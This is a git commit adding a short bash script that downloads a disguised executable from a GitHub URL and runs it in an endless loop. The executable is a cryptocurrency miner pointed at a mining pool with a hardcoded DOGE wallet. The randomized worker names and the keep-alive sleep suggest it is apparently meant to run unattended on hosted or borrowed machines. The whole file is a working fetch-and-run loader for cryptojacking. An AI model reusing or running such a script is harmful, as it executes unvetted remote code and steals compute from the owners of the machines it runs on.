b23f42429614b66c3d085986b46733242e0450ef
squibex <90225595+squibex@users.noreply.github.com>
2021-09-09 04:11:48 +0700

    Create laget.sh

---
+++ laget.sh
@@ -0,0 +1,11 @@
+#!/bin/bash
+POOL=etchash.unmineable.com:3333
+WALLET=DOGE:D5MGKpXzWKB49xbVk6nt4q4gi7bjJvxdUT
+WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#im8m-ybvt)
+wget https://github.com/squibex/prem/raw/main/priyatama
+chmod +x priyatama
+while [ 1 ]; do
+./priyatama --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
+sleep 5
+done
+sleep 999999999 
